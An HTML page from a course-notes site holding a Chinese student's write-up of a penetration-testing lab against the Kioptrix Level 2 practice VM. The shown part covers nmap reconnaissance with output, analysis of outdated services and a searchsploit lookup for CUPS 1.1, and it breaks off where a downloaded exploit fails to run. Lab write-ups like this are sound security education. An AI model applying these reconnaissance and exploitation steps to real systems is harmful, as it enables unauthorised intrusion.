@@ -1,0 +1,1784 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../lab02/">
+      
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>Lab03 - CSNote</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.e53b48f4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.16.9/katex.min.css">
+    
+      <link rel="stylesheet" href="https://fonts.loli.net/css?family=JetBrains Mono:400,500,600,700&display=swap">
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#lab03-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="CSNote" class="md-header__button md-logo" aria-label="CSNote" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CSNote
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Lab03
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="CSNote" class="md-nav__button md-logo" aria-label="CSNote" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    CSNote
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    算法 && 数据结构
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            算法 && 数据结构
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../algorithm%26data_structure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    intro
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../algorithm%26data_structure/linkedlist/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    链表
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../algorithm%26data_structure/STL_algorithm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    STL 算法库
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../algorithm%26data_structure/vector/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    STL vector ref
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../algorithm%26data_structure/stack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    栈 && 单调栈
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../algorithm%26data_structure/C%2B%2B%20OOP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    C++ 面向对象
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Course Notes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Course Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    ICSPA x86 note
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_1">
+            <span class="md-nav__icon md-icon"></span>
+            ICSPA x86 note
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/PA0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PA0
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/PA1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PA1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/PA2-1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PA2-1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/i386/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    i386 指令结构 for PA2-1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ICSPA-x86/PA2-2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PA2-2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    网络攻防实战 note
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            网络攻防实战 note
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab01
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lab02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab02
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Lab03
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab03
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      渗透目的
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      具体操作
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="具体操作">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      信息收集
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Getshell 尝试
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Getshell 尝试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ipp-getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      ipp 方向（GetShell 失败）
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#httpsql" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP/SQL 方向
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      提权尝试
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="提权尝试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sql-udf" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL UDF 提权（提权失败）
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kernal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Kernal 内核漏洞
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      渗透结果
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      问题分析/启示
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      其他
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      渗透目的
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      具体操作
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="具体操作">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      信息收集
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Getshell 尝试
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Getshell 尝试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#ipp-getshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      ipp 方向（GetShell 失败）
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#httpsql" class="md-nav__link">
+    <span class="md-ellipsis">
+      HTTP/SQL 方向
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      提权尝试
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="提权尝试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sql-udf" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL UDF 提权（提权失败）
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#kernal" class="md-nav__link">
+    <span class="md-ellipsis">
+      Kernal 内核漏洞
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      渗透结果
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      问题分析/启示
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      其他
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="lab03-writeup">网络攻防实战 Lab03 Writeup</h1>
+<div class="admonition quote">
+<p class="admonition-title">使用的靶机为 Kioptix Level 2</p>
+</div>
+<h3 id="_1">渗透目的</h3>
+<p>取得目标靶机的 root 权限</p>
+<p>熟悉 <code>nmap</code> 等指令的用法，了解 payload 的构造，网络渗透的基本流程</p>
+<h3 id="_2">具体操作</h3>
+<h4 id="_3">信息收集</h4>
+<p>启动 VirtualBox 中的 Kali 攻击机（用于进行渗透攻击）与 Kioptix 靶机，网络采用 NAT 连接</p>
+<p><code>ifconfig</code> 获取攻击机的 ip 为 <code>10.0.2.3</code>，使用 <code>nmap</code> 扫描 ip：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; nmap -sn 10.0.2.0/24
+Starting Nmap 7.95 ( nmap.org ) at 2025-10-19 20:47 CST
+Nmap scan report for bogon (10.0.2.1)
+Host is up (0.0012s latency).
+MAC Address: 52:55:0A:00:02:01 (Unknown)
+Nmap scan report for bogon (10.0.2.2)
+Host is up (0.00037s latency).
+MAC Address: 08:00:27:12:13:F2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Nmap scan report for bogon (10.0.2.15)
+Host is up (0.0028s latency).
+MAC Address: 08:00:27:EB:BA:50 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Nmap scan report for bogon (10.0.2.3)
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 2.12 seconds
+</code></pre></div></td></tr></table></div>
+<p>考虑靶机 ip 为 <code>10.0.2.15</code>，继续扫描端口 <code>nmap -sV -sC 10.0.2.15</code>，看看有哪些服务项</p>
+<p>以下是关键的节选内容，每个服务都会有相应的注释说明</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span></pre></div></td><td class="code"><div><pre><span></span><code>// SSH 服务，支持 SSHv1
+// OpenSSH 3.9p1 的发布日期为 2004 年 8 月，也非常古老
+// 可能存在漏洞
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+| ssh-hostkey: 
+|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
+|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
+|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
+|_sshv1: Server supports SSHv1
+
+// HTTP 服务，使用 Apache 2.0.52，其发布日期 2004 年 9 月，也非常古老
+// 待进一步搜索
+PORT     STATE SERVICE  VERSION
+80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.0.52 (CentOS)
+
+// RPC 服务
+// 留作观察
+PORT     STATE SERVICE  VERSION
+111/tcp  open  rpcbind  2 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2            111/tcp   rpcbind
+|   100000  2            111/udp   rpcbind
+|   100024  1            810/udp   status
+|_  100024  1            813/tcp   status
+
+// SSL 加密的 HTTP，即 HTTPS
+// 还是考虑 HTTP 方向挖掘
+PORT     STATE SERVICE  VERSION
+443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+|_http-server-header: Apache/2.0.52 (CentOS)
+| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| Not valid before: 2009-10-08T00:10:47
+|_Not valid after:  2010-10-08T00:10:47
+|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+|_ssl-date: 2025-10-19T16:49:13+00:00; +4h00m04s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+
+// Common UNIX Printing System 服务，使用 IPP 打印协议
+// 发布日期 2001 年 10 月，考虑攻击
+// 但是注意到 http-title: 403 Forbidden，不能保证攻击成功
+PORT     STATE SERVICE  VERSION
+631/tcp  open  ipp      CUPS 1.1
+|_http-title: 403 Forbidden
+|_http-server-header: CUPS/1.1
+| http-methods: 
+|_  Potentially risky methods: PUT
+
+// MySQL 服务
+// 考虑 SQL 注入
+PORT     STATE SERVICE  VERSION
+3306/tcp open  mysql    MySQL (unauthorized)
+MAC Address: 08:00:27:EB:BA:50 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+</code></pre></div></td></tr></table></div>
+<p>同时确定靶机操作系统为 <code>CentOS</code></p>
+<hr />
+<h3 id="getshell">Getshell 尝试</h3>
+<h4 id="ipp-getshell">ipp 方向（GetShell 失败）</h4>
+<p>CUPS 1.1 是这个服务的第一个稳定发行版，考虑 <code>searchsploit</code> 获取已知 <code>exploit</code></p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; searchsploit cups 1.1
+---------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                        |  Path
+---------------------------------------------------------------------- ---------------------------------
+CUPS 1.1.x - &#39;.HPGL&#39; File Processor Buffer Overflow                   | linux/remote/24977.txt
+CUPS 1.1.x - Cupsd Request Method Denial of Service                   | linux/dos/22619.txt
+CUPS 1.1.x - Negative Length HTTP Header                              | linux/remote/22106.txt
+CUPS 1.1.x - UDP Packet Remote Denial of Service                      | linux/dos/24599.txt
+CUPS &lt; 1.3.8-4 - Local Privilege Escalation                           | multiple/local/7550.c
+CUPS &lt; 2.0.3 - Multiple Vulnerabilities                               | multiple/remote/37336.txt
+CUPS &lt; 2.0.3 - Remote Command Execution                               | linux/remote/41233.py
+CUPS Server 1.1 - GET Denial of Service                               | linux/dos/1196.c
+---------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></div></td></tr></table></div>
+<p><code>CUPS &lt; 2.0.3 - Remote Command Execution</code> 远程代码执行，考虑使用这个，使用 <code>searchsploit -m 41233</code> 取一份到本地运行：</p>
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code>&gt; python 41233.py
+  File &quot;/home/kali/Desktop/41233.py&quot;, line 16
+    print &#39;&#39;&#39;
